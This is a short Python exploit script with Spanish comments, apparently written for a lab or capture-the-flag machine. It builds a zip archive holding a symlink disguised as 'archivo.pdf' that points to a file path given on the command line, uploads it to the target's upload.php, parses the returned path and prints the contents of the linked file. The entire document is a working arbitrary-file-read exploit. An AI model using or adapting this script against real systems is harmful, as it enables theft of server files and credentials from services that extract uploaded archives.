#!/usr/bin/env python3
import io
import re
import sys
import zipfile
import requests
from datetime import datetime


ip_victima = "10.10.11.229"
ruta_archivo = sys.argv[1] # ruta dinámica por consola

zip = io.BytesIO()

# Creación del zip malicioso
with zipfile.ZipFile(zip, "w") as archivo_zip:
    info = zipfile.ZipInfo("archivo.pdf")
    info.create_system = 3
    info.external_attr = 0xA0000000
    info.date_time = datetime.now().timetuple()[:6]
    archivo_zip.writestr(info, ruta_archivo)

# Envío del archivo malicioso al servidor de la víctima
files = {'resume.zip': (zip.getbuffer(), {"Content-Type": "application/zip"})}
r = requests.post(f'http://{ip_victima}/upload.php', 
                  files={"zipFile": ('archivo.zip', zip.getbuffer(), {"Content-Type": "application/zip"})},
                  data={"submit": ""}
            )

# Extracción de la URL del archivo del servidor
(url, ) = re.findall(r'path:</p><a href="(.*)">\1</a>', r.text)

# Descarga y muestra en pantalla el contenido del archivo
r = requests.get(f"http://{ip_victima}/{url}")
sys.stdout.buffer.write(r.content)
